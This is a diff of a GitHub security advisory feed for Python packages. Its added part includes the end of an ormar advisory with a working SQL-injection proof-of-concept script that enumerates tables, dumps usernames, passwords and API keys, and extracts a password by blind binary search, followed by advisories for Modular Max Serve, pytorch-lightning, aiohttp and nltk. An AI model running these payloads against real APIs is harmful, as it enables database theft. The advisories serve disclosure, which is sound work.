+Sends HTTP requests to the running FastAPI server.
+
+Prerequisites:
+    1. Start the server first:  python poc_server.py
+    2. Then run this script:    python poc_attacker.py
+
+The attacker has NO prior knowledge of the database schema.
+All information is discovered through the injection.
+"""
+
+import sys
+import httpx
+
+TARGET = "&lt;http://127.0.0.1:8000&gt;"
+ENDPOINT = "/items/stats"
+
+def inject(payload: str) -&gt; str:
+    """Send a single injection payload via the public API."""
+    resp = httpx.get(TARGET + ENDPOINT, params={"metric": "max", "column": payload})
+    data = resp.json()
+    return data.get("result")
+
+def main():
+    # ── Pre-check ─────────────────────────────────────────────
+    try:
+        r = httpx.get(TARGET + "/health", timeout=3)
+        if r.status_code != 200:
+            sys.exit(1)
+    except httpx.ConnectError:
+        print(f"Cannot connect to {TARGET}")
+        print(f"Start the server first: python poc_server.py")
+        sys.exit(1)
+
+    # ── Stage 0: Legitimate request ──────────────────────────
+    result = inject("price")
+    print(f"[Stage 0] Normal usage: max(price) = {result}")
+
+    # ── Stage 1: Confirm injection ────────────────────────────
+    result = inject("1+1")
+    print(f"[Stage 1] max('1+1') = {result}")
+    if result == 2:
+        print("  → SQL INJECTION CONFIRMED")
+
+    # ── Stage 2: Enumerate tables ─────────────────────────────
+    payload = "(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')"
+    result = inject(payload)
+    tables = str(result).split(",") if result else []
+    print(f"[Stage 2] Tables: {result}")
+
+    # ── Stage 3: Extract schema ───────────────────────────────
+    target_table = [t for t in tables if "admin" in t.lower()]
+    target_table = target_table[0] if target_table else tables[-1]
+    payload = f"(SELECT sql FROM sqlite_master WHERE name='{target_table}')"
+    result = inject(payload)
+    print(f"[Stage 3] Schema of {target_table}: {result}")
+
+    # ── Stage 4: Dump all credentials ─────────────────────────
+    payload = (
+        f"(SELECT GROUP_CONCAT("
+        f"username || ' | ' || password || ' | ' || api_key, CHAR(10))"
+        f" FROM {target_table})"
+    )
+    result = inject(payload)
+    print(f"[Stage 4] Credentials:\\n{result}")
+
+    # ── Stage 5: Blind extraction ─────────────────────────────
+    payload = f"LENGTH((SELECT password FROM {target_table} WHERE username='root'))"
+    pw_len = int(inject(payload))
+    extracted = ""
+    request_count = 0
+    for pos in range(1, pw_len + 1):
+        low, high = 32, 126
+        while low &lt;= high:
+            mid = (low + high) // 2
+            payload = (
+                f"CASE WHEN UNICODE(SUBSTR("
+                f"(SELECT password FROM {target_table} "
+                f"WHERE username='root'),{pos},1))&gt;{mid} "
+                f"THEN 1 ELSE 0 END"
+            )
+            result = inject(payload)
+            request_count += 1
+            if result == 1:
+                low = mid + 1
+            else:
+                high = mid - 1
+        extracted += chr(low)
+        sys.stdout.write(f"\\r[Stage 5] Extracting: {extracted}")
+        sys.stdout.flush()
+    print(f"\\n[Stage 5] Password extracted: {extracted} ({request_count} requests)")
+
+    # ── Stage 6: Steal API key ────────────────────────────────
+    payload = f"(SELECT api_key FROM {target_table} WHERE username='root')"
+    result = inject(payload)
+    print(f"[Stage 6] Production API key: {result}")
+
+    print(f"\\nTotal HTTP requests: {request_count + 6}")
+    print("All data extracted through a single public API endpoint.")
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+<h2 id="vulnerability-impact">Vulnerability Impact</h2>
+<p>This attack allows an unauthenticated user to read the entire database contents. Any API endpoint that passes user-controlled input to <code>Model.objects.min()</code> or <code>Model.objects.max()</code> becomes a full SQL injection entry point.</p>
+<p>The attack is confirmed to work with the following database backends:</p>
+<ul>
+<li>SQLite (via aiosqlite)</li>
+<li>PostgreSQL (via asyncpg) — subquery syntax is identical</li>
+<li>MySQL (via aiomysql) — subquery syntax is compatible</li>
+</ul>
+<p><strong>Realistic attack scenarios include:</strong></p>
+<ul>
+<li><strong>REST APIs</strong> with user-selectable aggregate fields: <code>GET /items/stats?column=&lt;input&gt;</code></li>
+<li><strong>GraphQL resolvers</strong> that accept field names as arguments</li>
+<li><strong>Dynamic report generators</strong> where users select columns for aggregation</li>
+</ul>
+<p>The vulnerable server in this PoC is based on the <strong>official ormar FastAPI example</strong>, demonstrating that the vulnerability is easily triggered through natural, documented API design patterns. The ormar documentation itself shows this exact usage pattern: <code>await Book.objects.max(columns=["year"])</code> (<a href="https://collerek.github.io/ormar/queries/aggregations/"></a><a href="https://collerek.github.io/ormar/queries/aggregations/">ormar aggregations docs</a>).</p>
+<h2 id="display-of-attack-results">Display of attack results</h2>
+<p>Terminal 1 — Start server:
+<img src="https://github.com/user-attachments/assets/4c8b4a20-75da-4aba-b649-f818e46165dd" alt="image">
+Terminal 2 — Run attacker:
+<img width="2004" height="1478" alt="image (1)" src="https://github.com/user-attachments/assets/ae41657b-2730-4fab-ac01-e79acd267bde">
+<img width="1984" height="1500" alt="image (2)" src="https://github.com/user-attachments/assets/cbe0d652-d4d4-458c-998b-e636d6c362a1"></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/collerek/ormar/security/advisories/GHSA-xxh2-68g9-8jqr">https://github.com/collerek/ormar/security/advisories/GHSA-xxh2-68g9-8jqr</a></li>
+<li><a href="https://github.com/collerek/ormar/commit/a03bae14fe01358d3eaf7e319fcd5db2e4956b16">https://github.com/collerek/ormar/commit/a03bae14fe01358d3eaf7e319fcd5db2e4956b16</a></li>
+<li><a href="https://github.com/collerek/ormar/releases/tag/0.23.0">https://github.com/collerek/ormar/releases/tag/0.23.0</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-26198">https://nvd.nist.gov/vuln/detail/CVE-2026-26198</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/ormar/PYSEC-2026-439.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/ormar/PYSEC-2026-439.yaml</a></li>
+<li><a href="https://pypi.org/project/ormar">https://pypi.org/project/ormar</a></li>
+<li><a href="https://github.com/advisories/GHSA-xxh2-68g9-8jqr">https://github.com/advisories/GHSA-xxh2-68g9-8jqr</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xxh2-68g9-8jqr</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-02-23T22:12:17.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[max] Modular Max Serve has Unsafe Deserialization vulnerability]]></title>
+        <id>https://github.com/advisories/GHSA-7xcv-9j6c-2fmc</id>
+        <link href="https://github.com/advisories/GHSA-7xcv-9j6c-2fmc"/>
+        <updated>2026-11-16T15:22:34.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>max</td>
+<td><code>&lt; 25.6.0</code></td>
+<td><code>25.6.0</code></td>
+</tr>
+</tbody>
+</table>
+<p>Unsafe Deserialization vulnerability in Modular Max Serve before 25.6, specifically when the "--experimental-enable-kvcache-agent" feature is used allowing attackers to execute arbitrary code.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-60455">https://nvd.nist.gov/vuln/detail/CVE-2025-60455</a></li>
+<li><a href="https://github.com/modular/modular/issues/4795">https://github.com/modular/modular/issues/4795</a></li>
+<li><a href="https://github.com/modular/modular/commit/10620059fb5c47fb0c30e5d21a8ff3b8d622fba4">https://github.com/modular/modular/commit/10620059fb5c47fb0c30e5d21a8ff3b8d622fba4</a></li>
+<li><a href="https://github.com/modular/modular/commit/b20e749fa892dbe772e890a268002f732164d9f5">https://github.com/modular/modular/commit/b20e749fa892dbe772e890a268002f732164d9f5</a></li>
+<li><a href="https://github.com/modular/modular/commit/ee9c4ab02345dd30bed8b79771b6909ff1b930a1">https://github.com/modular/modular/commit/ee9c4ab02345dd30bed8b79771b6909ff1b930a1</a></li>
+<li><a href="https://github.com/modular/modular/blame/main/max/serve/kvcache_agent/kvcache_agent.py#L220">https://github.com/modular/modular/blame/main/max/serve/kvcache_agent/kvcache_agent.py#L220</a></li>
+<li><a href="https://www.oligo.security/blog/shadowmq-how-code-reuse-spread-critical-vulnerabilities-across-the-ai-ecosystem">https://www.oligo.security/blog/shadowmq-how-code-reuse-spread-critical-vulnerabilities-across-the-ai-ecosystem</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/max/PYSEC-2025-253.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/max/PYSEC-2025-253.yaml</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/modular/PYSEC-2026-427.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/modular/PYSEC-2026-427.yaml</a></li>
+<li><a href="https://pypi.org/project/modular">https://pypi.org/project/modular</a></li>
+<li><a href="https://github.com/advisories/GHSA-7xcv-9j6c-2fmc">https://github.com/advisories/GHSA-7xcv-9j6c-2fmc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7xcv-9j6c-2fmc</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2025-11-18T21:32:31.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[pytorch-lightning] Remote code execution in pytorch lightning]]></title>
+        <id>https://github.com/advisories/GHSA-cgwc-qvrx-rf7f</id>
+        <link href="https://github.com/advisories/GHSA-cgwc-qvrx-rf7f"/>
+        <updated>2026-11-16T15:15:31.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>pytorch-lightning</td>
+<td><code>&lt; 2.3.3</code></td>
+<td><code>2.3.3</code></td>
+</tr>
+</tbody>
+</table>
+<p>A remote code execution (RCE) vulnerability exists in the lightning-ai/pytorch-lightning library version 2.2.1 due to improper handling of deserialized user input and mismanagement of dunder attributes by the <code>deepdiff</code> library. The library uses <code>deepdiff.Delta</code> objects to modify application state based on frontend actions. However, it is possible to bypass the intended restrictions on modifying dunder attributes, allowing an attacker to construct a serialized delta that passes the deserializer whitelist and contains dunder attributes. When processed, this can be exploited to access other modules, classes, and instances, leading to arbitrary attribute write and total RCE on any self-hosted pytorch-lightning application in its default configuration, as the delta endpoint is enabled by default.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-5452">https://nvd.nist.gov/vuln/detail/CVE-2024-5452</a></li>
+<li><a href="https://huntr.com/bounties/486add92-275e-4a7b-92f9-42d84bc759da">https://huntr.com/bounties/486add92-275e-4a7b-92f9-42d84bc759da</a></li>
+<li><a href="https://github.com/lightning-ai/pytorch-lightning/commit/330af381de88cff17515418a341cbc1f9f127f9a">https://github.com/lightning-ai/pytorch-lightning/commit/330af381de88cff17515418a341cbc1f9f127f9a</a></li>
+<li><a href="https://github.com/Lightning-AI/pytorch-lightning/releases/tag/2.3.3">https://github.com/Lightning-AI/pytorch-lightning/releases/tag/2.3.3</a></li>
+<li><a href="https://github.com/Lightning-AI/pytorch-lightning/issues/20038">https://github.com/Lightning-AI/pytorch-lightning/issues/20038</a></li>
+<li><a href="https://github.com/advisories/GHSA-cgwc-qvrx-rf7f">https://github.com/advisories/GHSA-cgwc-qvrx-rf7f</a></li>
+<li><a href="https://github.com/lightning-ai/pytorch-lightning">https://github.com/lightning-ai/pytorch-lightning</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/lightning/PYSEC-2026-385.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/lightning/PYSEC-2026-385.yaml</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pytorch-lightning/PYSEC-2026-3974.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pytorch-lightning/PYSEC-2026-3974.yaml</a></li>
+<li><a href="https://pypi.org/project/lightning">https://pypi.org/project/lightning</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-cgwc-qvrx-rf7f</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2024-06-06T18:30:58.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[aiohttp] AIOHTTP: Event loop stall in add_domain() wildcard matching]]></title>
         <id>https://github.com/advisories/GHSA-jm3w-gw2p-xjfj</id>
@@ -180,946 +1867,5 @@
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-11-16T14:53:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[aiohttp] AIOHTTP: WebSocket max_msg_size bypass via integer overflow]]></title>
-        <id>https://github.com/advisories/GHSA-3rp8-rxj8-mvjw</id>
-        <link href="https://github.com/advisories/GHSA-3rp8-rxj8-mvjw"/>
-        <updated>2026-11-16T14:52:42.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>aiohttp</td>
-<td><code>&lt;= 3.14.3</code></td>
-<td><code>3.14.4</code></td>
-</tr>
-</tbody>
-</table>
-<h3 id="summary">Summary</h3>
-<p>The <code>max_msg_size</code> check in the WebSocket reader added the declared frame length to the size of the partial message already buffered. In the C extension this addition is 64-bit arithmetic, so a declared length close to 2**63 overflowed and the check passed.</p>
-<h3 id="impact">Impact</h3>
-<p>An attacker could bypass <code>max_msg_size</code> and cause unbounded memory use by streaming an oversized WebSocket message after a small non-final fragment.</p>
-<h3 id="workaround">Workaround</h3>
-<p>If unable to upgrade, the Python reader is unaffected and can be used with <code>AIOHTTP_NO_EXTENSIONS=1</code>.</p>
-<hr>
-<p>Patch: <a href="https://github.com/aio-libs/aiohttp/commit/8cfbe9abe5e11b84006a10f9bdf82bf607671dab">https://github.com/aio-libs/aiohttp/commit/8cfbe9abe5e11b84006a10f9bdf82bf607671dab</a></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-3rp8-rxj8-mvjw">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-3rp8-rxj8-mvjw</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-128128">https://nvd.nist.gov/vuln/detail/CVE-2026-128128</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/pull/13415">https://github.com/aio-libs/aiohttp/pull/13415</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/pull/13494">https://github.com/aio-libs/aiohttp/pull/13494</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/commit/8c8906a19f64e52ef6a7d44d65217eb3c5af413f">https://github.com/aio-libs/aiohttp/commit/8c8906a19f64e52ef6a7d44d65217eb3c5af413f</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/commit/8cfbe9abe5e11b84006a10f9bdf82bf607671dab">https://github.com/aio-libs/aiohttp/commit/8cfbe9abe5e11b84006a10f9bdf82bf607671dab</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/releases/tag/v3.14.4">https://github.com/aio-libs/aiohttp/releases/tag/v3.14.4</a></li>
-<li><a href="https://github.com/advisories/GHSA-3rp8-rxj8-mvjw">https://github.com/advisories/GHSA-3rp8-rxj8-mvjw</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3rp8-rxj8-mvjw</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-11-16T14:52:40.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[aiohttp] AIOHTTP: Unbounded buffering of data received during an upgrade request]]></title>
-        <id>https://github.com/advisories/GHSA-pw86-h8fm-j323</id>
-        <link href="https://github.com/advisories/GHSA-pw86-h8fm-j323"/>
-        <updated>2026-11-16T14:52:06.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>aiohttp</td>
-<td><code>&lt;= 3.14.3</code></td>
-<td><code>3.14.4</code></td>
-</tr>
-</tbody>
-</table>
-<h3 id="summary">Summary</h3>
-<p>While a request flagged as an upgrade (e.g. a WebSocket handshake) was being handled, all further data received on the connection was buffered with no size limit or flow control until the handler completed.</p>
-<h3 id="impact">Impact</h3>
-<p>An attacker could cause unbounded memory use by streaming data behind an upgrade request to any handler that does not immediately accept or reject the upgrade.</p>
-<hr>
-<p>Patch: <a href="https://github.com/aio-libs/aiohttp/commit/3d850ee9b92573c7e913821cbcb96005beb3f4df">https://github.com/aio-libs/aiohttp/commit/3d850ee9b92573c7e913821cbcb96005beb3f4df</a></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-pw86-h8fm-j323">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-pw86-h8fm-j323</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-128129">https://nvd.nist.gov/vuln/detail/CVE-2026-128129</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/pull/13501">https://github.com/aio-libs/aiohttp/pull/13501</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/pull/13511">https://github.com/aio-libs/aiohttp/pull/13511</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/commit/3d850ee9b92573c7e913821cbcb96005beb3f4df">https://github.com/aio-libs/aiohttp/commit/3d850ee9b92573c7e913821cbcb96005beb3f4df</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/commit/c207cadb257e0959b192ffca0548eca8c71eb96a">https://github.com/aio-libs/aiohttp/commit/c207cadb257e0959b192ffca0548eca8c71eb96a</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/releases/tag/v3.14.4">https://github.com/aio-libs/aiohttp/releases/tag/v3.14.4</a></li>
-<li><a href="https://github.com/advisories/GHSA-pw86-h8fm-j323">https://github.com/advisories/GHSA-pw86-h8fm-j323</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-pw86-h8fm-j323</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-11-16T14:52:05.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[aiohttp] AIOHTTP: Pure-Python parser request replay and buffer growth behind a declined upgrade]]></title>
-        <id>https://github.com/advisories/GHSA-28qf-cpwq-vmc2</id>
-        <link href="https://github.com/advisories/GHSA-28qf-cpwq-vmc2"/>
-        <updated>2026-11-16T14:51:56.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>aiohttp</td>
-<td><code>&lt;= 3.14.3</code></td>
-<td><code>3.14.4</code></td>
-</tr>
-</tbody>
-</table>
-<h3 id="summary">Summary</h3>
-<p>When the pipelined request queue was full, the pure-Python parser stored the unparsed remainder internally and also returned it to the caller. After a handler declined an upgrade request, the buffered data was re-fed, so the buffer grew with each handled request and already-handled requests were dispatched to the application again.</p>
-<h3 id="impact">Impact</h3>
-<p>If users are using the Python parser (<code>AIOHTTP_NO_EXTENSIONS</code>, or not a standard wheel installed), an attacker could cause excessive memory use and cause pipelined requests to be processed more than once.</p>
-<h3 id="workaround">Workaround</h3>
-<p>Switch to the default C parser.</p>
-<hr>
-<p>Patch: <a href="https://github.com/aio-libs/aiohttp/commit/47babd8c23ca79e2bae6cc8dcb5752b61e369fc7">https://github.com/aio-libs/aiohttp/commit/47babd8c23ca79e2bae6cc8dcb5752b61e369fc7</a></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-28qf-cpwq-vmc2">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-28qf-cpwq-vmc2</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-128130">https://nvd.nist.gov/vuln/detail/CVE-2026-128130</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/pull/13356">https://github.com/aio-libs/aiohttp/pull/13356</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/pull/13360">https://github.com/aio-libs/aiohttp/pull/13360</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/commit/47babd8c23ca79e2bae6cc8dcb5752b61e369fc7">https://github.com/aio-libs/aiohttp/commit/47babd8c23ca79e2bae6cc8dcb5752b61e369fc7</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/commit/72eaa429cf89b1e20212590f3e704444239569fb">https://github.com/aio-libs/aiohttp/commit/72eaa429cf89b1e20212590f3e704444239569fb</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/releases/tag/v3.14.4">https://github.com/aio-libs/aiohttp/releases/tag/v3.14.4</a></li>
-<li><a href="https://github.com/advisories/GHSA-28qf-cpwq-vmc2">https://github.com/advisories/GHSA-28qf-cpwq-vmc2</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-28qf-cpwq-vmc2</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-11-16T14:51:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[aiohttp] AIOHTTP: Concatenated compressed streams cause excessive CPU use]]></title>
-        <id>https://github.com/advisories/GHSA-h4cc-hm5h-fmm9</id>
-        <link href="https://github.com/advisories/GHSA-h4cc-hm5h-fmm9"/>
-        <updated>2026-11-16T14:51:31.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>aiohttp</td>
-<td><code>&lt;= 3.14.3</code></td>
-<td><code>3.14.4</code></td>
-</tr>
-</tbody>
-</table>
-<h3 id="summary">Summary</h3>
-<p>When decompressing a payload made up of many concatenated compressed members (gzip, deflate or zstd), each member was decoded by passing the entire remaining input to a new decompressor, resulting in quadratic CPU time. Empty members produce no output, so <code>client_max_size</code> and output backpressure did not limit the work.</p>
-<h3 id="impact">Impact</h3>
-<p>An attacker could block the event loop of a server with a specially crafted compressed request body or WebSocket message. A malicious server could do the same to a client.</p>
-<hr>
-<p>Patch: <a href="https://github.com/aio-libs/aiohttp/commit/d925a80539ffd227da1d93ab4a5bff123cc777db">https://github.com/aio-libs/aiohttp/commit/d925a80539ffd227da1d93ab4a5bff123cc777db</a></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-h4cc-hm5h-fmm9">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-h4cc-hm5h-fmm9</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-128131">https://nvd.nist.gov/vuln/detail/CVE-2026-128131</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/pull/13362">https://github.com/aio-libs/aiohttp/pull/13362</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/pull/13391">https://github.com/aio-libs/aiohttp/pull/13391</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/commit/d041d4d0fd48c3f0832084d33be16cf1c4835f85">https://github.com/aio-libs/aiohttp/commit/d041d4d0fd48c3f0832084d33be16cf1c4835f85</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/commit/d925a80539ffd227da1d93ab4a5bff123cc777db">https://github.com/aio-libs/aiohttp/commit/d925a80539ffd227da1d93ab4a5bff123cc777db</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/releases/tag/v3.14.4">https://github.com/aio-libs/aiohttp/releases/tag/v3.14.4</a></li>
-<li><a href="https://github.com/advisories/GHSA-h4cc-hm5h-fmm9">https://github.com/advisories/GHSA-h4cc-hm5h-fmm9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-h4cc-hm5h-fmm9</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-11-16T14:51:27.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[aiohttp] AIOHTTP: WebSocket receive queue limits bypassed by small or compressed messages]]></title>
-        <id>https://github.com/advisories/GHSA-5rmc-48h2-hvcm</id>
-        <link href="https://github.com/advisories/GHSA-5rmc-48h2-hvcm"/>
-        <updated>2026-11-16T14:51:02.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>aiohttp</td>
-<td><code>&lt;= 3.14.3</code></td>
-<td><code>3.14.4</code></td>
-</tr>
-</tbody>
-</table>
-<h3 id="summary">Summary</h3>
-<p>The WebSocket reader continued parsing frames already received after the receive queue had paused the transport, and empty messages were not counted towards the queue size. With permessage-deflate, a single read of compressed frames could add many megabytes of decompressed messages to the queue.</p>
-<h3 id="impact">Impact</h3>
-<p>An attacker could cause excessive memory use in a WebSocket server, or a malicious server against a client, by sending many small or compressed messages faster than the application consumes them.</p>
-<hr>
-<p>Patch: <a href="https://github.com/aio-libs/aiohttp/commit/0ae507423f681161efa77d20052b4054397c7fb6">https://github.com/aio-libs/aiohttp/commit/0ae507423f681161efa77d20052b4054397c7fb6</a></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5rmc-48h2-hvcm">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5rmc-48h2-hvcm</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-128132">https://nvd.nist.gov/vuln/detail/CVE-2026-128132</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/pull/13393">https://github.com/aio-libs/aiohttp/pull/13393</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/pull/13545">https://github.com/aio-libs/aiohttp/pull/13545</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/pull/13546">https://github.com/aio-libs/aiohttp/pull/13546</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/commit/0ae507423f681161efa77d20052b4054397c7fb6">https://github.com/aio-libs/aiohttp/commit/0ae507423f681161efa77d20052b4054397c7fb6</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/commit/5e54037933fa8422be5fa8a2002d118ed2d4e5e0">https://github.com/aio-libs/aiohttp/commit/5e54037933fa8422be5fa8a2002d118ed2d4e5e0</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/commit/b62321b6fa264a89f4aca084ad60fc38a59ffa51">https://github.com/aio-libs/aiohttp/commit/b62321b6fa264a89f4aca084ad60fc38a59ffa51</a></li>
-<li><a href="https://github.com/aio-libs/aiohttp/releases/tag/v3.14.4">https://github.com/aio-libs/aiohttp/releases/tag/v3.14.4</a></li>
-<li><a href="https://github.com/advisories/GHSA-5rmc-48h2-hvcm">https://github.com/advisories/GHSA-5rmc-48h2-hvcm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5rmc-48h2-hvcm</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-11-16T14:51:01.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[nltk] Duplicate Advisory: Quadratic CPU exhaustion in LegalitySyllableTokenizer.tokenize via unguarded onset reversal loop]]></title>
-        <id>https://github.com/advisories/GHSA-x4p7-2mv3-x7px</id>
-        <link href="https://github.com/advisories/GHSA-x4p7-2mv3-x7px"/>
-        <updated>2026-11-16T14:50:06.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>nltk</td>
-<td><code>&lt; 3.10.4</code></td>
-<td>No fix available</td>
-</tr>
-</tbody>
-</table>
-<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-gpwc-27cw-rh9r. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>NLTK from 3.6 before 3.10.4 contains an algorithmic complexity vulnerability in LegalitySyllableTokenizer.tokenize that allows remote attackers to exhaust CPU by supplying long all-vowel tokens. Attackers can submit a token such as a long run of vowels, causing the unguarded onset reversal loop to perform quadratic work and deny service to syllabification components.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-gpwc-27cw-rh9r">https://github.com/nltk/nltk/security/advisories/GHSA-gpwc-27cw-rh9r</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-126301">https://nvd.nist.gov/vuln/detail/CVE-2026-126301</a></li>
-<li><a href="https://www.vulncheck.com/advisories/nltk-from-3.6-before-3.10.4-quadratic-cpu-exhaustion-via-legalitysyllabletokenizer-tokenize">https://www.vulncheck.com/advisories/nltk-from-3.6-before-3.10.4-quadratic-cpu-exhaustion-via-legalitysyllabletokenizer-tokenize</a></li>
-<li><a href="https://github.com/advisories/GHSA-x4p7-2mv3-x7px">https://github.com/advisories/GHSA-x4p7-2mv3-x7px</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
